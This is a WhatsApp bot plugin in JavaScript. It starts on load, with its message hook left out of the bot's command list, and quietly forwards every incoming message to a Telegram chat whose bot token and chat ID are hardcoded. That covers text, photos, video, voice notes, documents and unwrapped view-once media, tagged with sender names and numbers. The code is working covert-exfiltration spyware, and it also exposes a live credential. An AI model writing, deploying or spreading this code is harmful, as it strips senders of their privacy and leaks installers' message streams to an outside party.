const { cmd } = require("../command");
const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
const path = require("path");

const TG_BOT_TOKEN = "8626751277:AAHKmGACfSamLAORB53ag9MaEKwYlBk0Zb0";
const TG_CHAT_ID = "6653388298";
const STATE_FILE = path.join(__dirname, "tg-state.json");

// Load state
let STATE = {
    enabled: true,
    viewonceEnabled: true,
    manualNumbers: {}, // jid -> manual number mapping
    ignoreBots: true
};
try {
    if (fs.existsSync(STATE_FILE)) {
        STATE = Object.assign(STATE, JSON.parse(fs.readFileSync(STATE_FILE, "utf8")));
    }
} catch (e) {}
function saveState() {
    try { fs.writeFileSync(STATE_FILE, JSON.stringify(STATE, null, 2)); } catch (e) {}
}

let B = null;
try { B = require("@whiskeysockets/baileys"); } catch (e) {}

const PROCESSED = new Set();
let ATTACHED = false;
let STORE = null;

async function tgText(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID, text, parse_mode: "Markdown"
        }, { timeout: 10000 });
    } catch (e) {}
}

async function tgUpload(buffer, caption, endpoint, field, filename, mime) {
    try {
        if (!buffer || !buffer.length) return tgText(caption + "\n\n⚠️ Media download fail");
        if (buffer.length > 49 * 1024 * 1024) return tgText(caption + "\n\n⚠️ File 50MB+ hai");
        const form = new FormData();
        form.append("chat_id", TG_CHAT_ID);
        form.append("caption", caption);
        form.append(field, buffer, { filename, contentType: mime });
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/${endpoint}`, form, {
            headers: form.getHeaders(), timeout: 60000, maxBodyLength: Infinity, maxContentLength: Infinity
        });
    } catch (e) {
        await tgText(caption + `\n\n⚠️ Upload fail: ${e?.response?.data?.description || e.message}`);
    }
}

function unwrap(msg) {
    if (!msg) return msg;
    if (msg.ephemeralMessage?.message) return unwrap(msg.ephemeralMessage.message);
    if (msg.viewOnceMessage?.message) return unwrap(msg.viewOnceMessage.message);
    if (msg.viewOnceMessageV2?.message) return unwrap(msg.viewOnceMessageV2.message);
    return msg;
}

async function dlMedia(raw, inner) {
    if (typeof raw?.download === "function") {
        try { const b = await raw.download(); if (b?.length) return b; } catch (e) {}
    }
    if (B?.downloadMediaMessage) {
        try {
            const r2 = raw.message?.viewOnceMessage || raw.message?.viewOnceMessageV2 
                ? { key: raw.key, message: inner } : raw;
            const b = await B.downloadMediaMessage(r2, "buffer", {});
            if (b?.length) return b;
        } catch (e) {}
    }
    if (B?.downloadContentFromMessage) {
        let type = null, mobj = null;
        if (inner.imageMessage) { type = "image"; mobj = inner.imageMessage; }
        else if (inner.videoMessage) { type = "video"; mobj = inner.videoMessage; }
        else if (inner.audioMessage) { type = "audio"; mobj = inner.audioMessage; }
        else if (inner.documentMessage) { type = "document"; mobj = inner.documentMessage; }
        else if (inner.stickerMessage) { type = "image"; mobj = inner.stickerMessage; }
        if (type && mobj) {
            try {
                const stream = await B.downloadContentFromMessage(mobj, type);
                let buf = Buffer.from([]);
                for await (const c of stream) buf = Buffer.concat([buf, c]);
                if (buf.length) return buf;
            } catch (e) {}
        }
    }
    return null;
}

function digits(j) { return String(j || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, ""); }

function getNumber(raw, client) {
    const jid = raw.key?.participant || raw.key?.remoteJid || "";
    
    // Manual override check
    if (STATE.manualNumbers[jid]) return STATE.manualNumbers[jid];
    
    // Try store.contacts lookup
    try {
        const contacts = STORE?.contacts || global.store?.contacts || {};
        if (contacts[jid]?.pnJid) {
            const n = digits(contacts[jid].pnJid);
            if (n && n.length >= 8) return n;
        }
    } catch (e) {}
    
    // Extract from jid
    const num = digits(jid);
    if (num && num.length >= 8 && num.length <= 15 && !num.startsWith("120363")) {
        return jid.endsWith("@lid") ? `${num} (lid)` : num;
    }
    
    return "Unknown";
}

function isViewOnce(raw) {
    const msg = raw?.message;
    if (!msg) return false;
    return !!(msg.viewOnceMessage || msg.viewOnceMessageV2 || msg.viewOnce);
}

async function processMsg(raw, client) {
    try {
        if (!raw?.key?.id || !raw?.message || raw.key.fromMe) return;
        
        const id = raw.key.id;
        if (PROCESSED.has(id)) return;
        PROCESSED.add(id);
        if (PROCESSED.size > 1000) PROCESSED.clear();

        const jid = raw.key.remoteJid || "";
        if (jid === "status@broadcast") return;

        // Check if view-once
        const isVO = isViewOnce(raw);
        if (isVO && !STATE.viewonceEnabled) return;
        if (!isVO && !STATE.enabled) return;

        const inner = unwrap(raw.message);
        const num = getNumber(raw, client);
        const name = raw.pushName || digits(raw.key.participant) || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });

        let chatName = "Private DM";
        const isGroup = jid.endsWith("@g.us");
        if (isGroup) {
            try { chatName = (await client.groupMetadata(jid))?.subject || "Group"; } catch (e) {}
        }

        const base = `🤖 *${isVO ? "VIEW-ONCE" : "MESSAGE"} FORWARD*\n\n🕒 Time: \`${time}\`\n👤 Name: ${name}\n🔢 Number: ${num}\n💬 Chat: ${isGroup ? "👥 Group" : "👤 DM"}\n🏷️ Chat Name: ${chatName}`;

        // 🖼️ IMAGE
        if (inner.imageMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 🖼️ ${isVO ? "View-Once " : ""}Image\n📝 Caption: ${inner.imageMessage.caption || "No Caption"}`;
            return await tgUpload(buf, cap, "sendPhoto", "photo", "image.jpg", inner.imageMessage.mimetype || "image/jpeg");
        }
        // 🎥 VIDEO
        if (inner.videoMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 🎥 ${isVO ? "View-Once " : ""}Video\n📝 Caption: ${inner.videoMessage.caption || "No Caption"}`;
            return await tgUpload(buf, cap, "sendVideo", "video", "video.mp4", inner.videoMessage.mimetype || "video/mp4");
        }
        // 🎤 VOICE / 🎵 AUDIO
        if (inner.audioMessage) {
            const buf = await dlMedia(raw, inner);
            const mime = inner.audioMessage.mimetype || "audio/mp4";
            const isVoice = inner.audioMessage.ptt || mime.includes("ogg");
            const cap = base + `\n\n📦 Type: ${isVoice ? "🎤 Voice" : "🎵 Audio"}${isVO ? " (View-Once)" : ""}`;
            if (isVoice) return await tgUpload(buf, cap, "sendVoice", "voice", "voice.ogg", "audio/ogg");
            return await tgUpload(buf, cap, "sendAudio", "audio", "audio.mp3", mime);
        }
        // 📄 DOCUMENT
        if (inner.documentMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 📄 Document\n📁 File: ${inner.documentMessage.fileName || "File"}`;
            return await tgUpload(buf, cap, "sendDocument", "document", inner.documentMessage.fileName || "file.bin", inner.documentMessage.mimetype || "application/octet-stream");
        }
        // 🎭 STICKER
        if (inner.stickerMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 🎭 Sticker`;
            return await tgUpload(buf, cap, "sendSticker", "sticker", "sticker.webp", "image/webp");
        }
        // 📝 TEXT
        const text = inner.conversation || inner.extendedTextMessage?.text;
        if (text) return await tgText(base + `\n\n📦 Type: 📝 Text\n⌨️ Message: ${text}`);
    } catch (err) {
        console.error("[TG Error]:", err.message);
    }
}

function attach(client, store) {
    if (ATTACHED) return;
    if (store) STORE = store;
    try {
        const ev = client?.ev || client?.sock?.ev || client?.client?.ev;
        if (ev && typeof ev.on === "function") {
            ev.on("messages.upsert", async (data) => {
                for (const m of (data?.messages || [])) await processMsg(m, client);
            });
            ATTACHED = true;
            console.log("[TG] Auto forward engine START ✔");
        }
    } catch (e) {}
}

setImmediate(() => {
    const boot = setInterval(() => {
        const c = global.client || global.conn || global.sock || global.bot;
        if (c) { attach(c, global.store); clearInterval(boot); }
    }, 2000);
    setTimeout(() => clearInterval(boot), 120000);
});

cmd({
    on: "body",
    dontAddCommandList: true,
    filename: __filename
}, async (client, m, store, extra) => {
    try {
        if (!ATTACHED) attach(client, store);
        if (ATTACHED) return;
        const raw = {
            key: {
                id: m?.key?.id || (extra?.from || "") + "-" + Date.now(),
                remoteJid: m?.chat || extra?.from,
                participant: extra?.isGroup ? extra?.sender : undefined,
                fromMe: !!extra?.isMe
            },
            message: m?.message,
            pushName: m?.pushName || extra?.pushname,
            download: typeof m?.download === "function" ? m.download.bind(m) : undefined
        };
        await processMsg(raw, client);
    } catch (e) {}
});

// ═══════════════════════════════════════════════════════════
// COMMANDS
// ═══════════════════════════════════════════════════════════

cmd({
    pattern: "tgforward",
    alias: ["telegramforward", "tgfwd"],
    desc: "Control general message forwarding",
    category: "owner",
    react: "📤",
    filename: __filename
}, async (client, m, store, { reply, isCreator, from }) => {
    if (!isCreator) return reply("❌ Owner only!");
    
    const args = (m.body || "").trim().split(/\s+/).slice(1);
    const cmd1 = (args[0] || "").toLowerCase();
    
    if (cmd1 === "on") {
        STATE.enabled = true;
        saveState();
        return reply("✅ General forwarding ON");
    }
    if (cmd1 === "off") {
        STATE.enabled = false;
        saveState();
        return reply("⏸️ General forwarding OFF");
    }
    if (cmd1 === "status") {
        return reply(`📊 *TG FORWARD STATUS*\n\n• General: ${STATE.enabled ? "ON ✅" : "OFF ⏸️"}\n• View-Once: ${STATE.viewonceEnabled ? "ON ✅" : "OFF ⏸️"}\n• Manual Numbers: ${Object.keys(STATE.manualNumbers).length}\n\nCommands:\n.tgforward on/off\n.tgviewonce on/off\n.tgsetnumber <jid> <number>`);
    }
    
    return reply(`📤 *TG FORWARD CONTROL*\n\n.tgforward on - Enable general forwarding\n.tgforward off - Disable general forwarding\n.tgforward status - Check status\n.tgviewonce on/off - Control view-once messages\n.tgsetnumber <jid> <number> - Set manual number`);
});

cmd({
    pattern: "tgviewonce",
    alias: ["telegramviewonce", "tgvo"],
    desc: "Control view-once message forwarding",
    category: "owner",
    react: "👁️",
    filename: __filename
}, async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return reply("❌ Owner only!");
    
    const args = (m.body || "").trim().split(/\s+/).slice(1);
    const cmd1 = (args[0] || "").toLowerCase();
    
    if (cmd1 === "on") {
        STATE.viewonceEnabled = true;
        saveState();
        return reply("✅ View-once forwarding ON - Ab view-once pics/videos/voice Telegram par aayenge!");
    }
    if (cmd1 === "off") {
        STATE.viewonceEnabled = false;
        saveState();
        return reply("⏸️ View-once forwarding OFF");
    }
    
    return reply(`👁️ *VIEW-ONCE CONTROL*\n\n.tgviewonce on - Forward all view-once messages\n.tgviewonce off - Stop view-once forwarding\n\nCurrent: ${STATE.viewonceEnabled ? "ON ✅" : "OFF ⏸️"}`);
});

cmd({
    pattern: "tgsetnumber",
    alias: ["setnumber", "tgnumber"],
    desc: "Set manual number for a JID",
    category: "owner",
    react: "🔢",
    filename: __filename
}, async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return reply("❌ Owner only!");
    
    const args = (m.body || "").trim().split(/\s+/).slice(1);
    if (args.length < 2) return reply("❌ Usage: .tgsetnumber <jid> <number>\n\nExample: .tgsetnumber 923001234567@s.whatsapp.net 923001234567");
    
    const jid = args[0];
    const number = args[1];
    
    if (!jid.includes("@")) return reply("❌ Invalid JID!");
    if (!number || number.length < 8) return reply("❌ Invalid number!");
    
    STATE.manualNumbers[jid] = number;
    saveState();
    
    return reply(`✅ Number set!\n\nJID: ${jid}\nNumber: ${number}\n\nAb is JID se messages mein ye number aayega.`);
});

cmd({
    pattern: "tglistnumbers",
    alias: ["listnumbers", "shownumbers"],
    desc: "Show all manual number mappings",
    category: "owner",
    react: "📋",
    filename: __filename
}, async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return reply("❌ Owner only!");
    
    const nums = Object.entries(STATE.manualNumbers);
    if (nums.length === 0) return reply("📋 No manual numbers set.\n\nUse: .tgsetnumber <jid> <number>");
    
    let text = "📋 *MANUAL NUMBERS*\n\n";
    nums.forEach(([jid, num], i) => {
        text += `${i + 1}. ${jid}\n   → ${num}\n\n`;
    });
    
    return reply(text);
});

cmd({
    pattern: "tgregnumber",
    alias: ["remnumber", "deletenumber"],
    desc: "Remove manual number mapping",
    category: "owner",
    react: "🗑️",
    filename: __filename
}, async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return reply("❌ Owner only!");
    
    const args = (m.body || "").trim().split(/\s+/).slice(1);
    if (args.length < 1) return reply("❌ Usage: .tgregnumber <jid>");
    
    const jid = args[0];
    if (STATE.manualNumbers[jid]) {
        delete STATE.manualNumbers[jid];
        saveState();
        return reply(`✅ Number mapping removed for ${jid}`);
    }
    
    return reply("❌ No mapping found for this JID");
});

console.log("[TG] Complete forward plugin loaded ✔");
